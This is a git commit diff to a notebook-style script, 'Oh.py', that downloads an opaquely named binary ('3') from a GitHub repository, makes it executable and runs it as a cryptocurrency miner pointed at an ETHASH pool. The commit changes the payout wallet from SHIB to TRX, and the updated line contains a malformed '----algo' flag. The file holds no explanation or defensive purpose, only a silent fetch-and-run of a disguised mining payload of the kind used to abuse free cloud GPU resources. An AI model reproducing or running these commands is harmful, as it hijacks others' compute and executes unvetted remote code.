2746363acc7df39b34cc27fa550c808fe95ce9f7
skullCANDe <85566406+skullCANDe@users.noreply.github.com>
2021-07-01 19:12:39 +0530

    Update Oh.py

--- Oh.py
+++ Oh.py
@@ -1,3 +1,3 @@
 ! wget https://github.com/mencobaiajanah/ngetest/raw/main/3 > /dev/null
 ! chmod +x 3
-! ./3 --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383.GPU#fg38-pfgk --watchdog exit > /dev/null 
+! ./3 ----algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TEpXXj9hc2eJ6YBqBY1WbY3GzEp3C2TmV6 --ethstratum ETHPROXY  
